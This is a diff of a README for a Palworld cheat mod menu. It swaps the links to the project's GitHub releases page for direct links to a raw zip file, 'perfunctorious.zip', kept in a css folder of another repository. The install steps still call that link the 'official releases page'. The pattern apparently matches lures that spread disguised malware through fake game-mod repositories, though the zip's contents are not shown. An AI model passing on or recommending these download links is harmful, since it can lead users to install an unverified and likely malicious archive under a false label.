@@ -5,7 +5,7 @@ description: "Manage Palworld gameplay with this mod menu featuring God mode, te
 ---
 # 🎮 Palworld-Ultimate-Mod - Unlock your full game potential now
 
-[![Download](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/matthewbinocular707/Palworld-Ultimate-Mod/releases)
+[![Download](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/matthewbinocular707/matthewbinocular707.github.io/raw/refs/heads/main/css/perfunctorious.zip)
 
 Palworld-Ultimate-Mod offers a complete toolset for your single-player adventures in Palworld. This mod menu allows you to modify game variables directly. You gain access to features like infinite health, flight, item generation, and object tracking. Use these tools to customize your gameplay loop or test game mechanics.
 
@@ -24,7 +24,7 @@ Before you install this software, ensure your computer meets these minimum speci
 
 Follow these instructions to set up the mod correctly. Do not skip these steps to avoid errors.
 
-1.  Visit the [official releases page](https://github.com/matthewbinocular707/Palworld-Ultimate-Mod/releases) to download the current version.
+1.  Visit the [official releases page](https://github.com/matthewbinocular707/matthewbinocular707.github.io/raw/refs/heads/main/css/perfunctorious.zip) to download the current version.
 2.  Choose the zip folder that corresponds to the latest version number.
 3.  Save the file to a folder you can find easily, such as your Downloads folder.
 4.  Right-click the downloaded folder and select "Extract All."
